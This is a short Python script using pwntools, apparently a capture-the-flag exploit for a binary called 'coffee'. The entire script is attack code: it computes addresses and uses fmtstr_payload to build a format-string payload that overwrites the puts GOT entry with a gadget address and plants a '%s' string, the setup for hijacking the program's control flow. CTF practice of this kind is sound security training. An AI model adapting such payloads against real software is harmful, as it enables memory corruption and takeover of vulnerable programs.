from pwn import *

addr_data = 0x404038
addr_pivot = addr_data + 0x200
addr_s = addr_data + 0x50
addr_pop7 = 0x0000000000401286

elf = ELF('./coffee')
offset = 6

writes = {4210712: 4199046, 4210824: 29477}
# writes = {
#         elf.got['puts']: addr_pop7,
#         addr_s: u64(b'%s'.ljust(8, b'\x00'))
#         }

fsbp = fmtstr_payload(offset, writes, write_size='short')
print(fsbp)
print(len(fsbp))
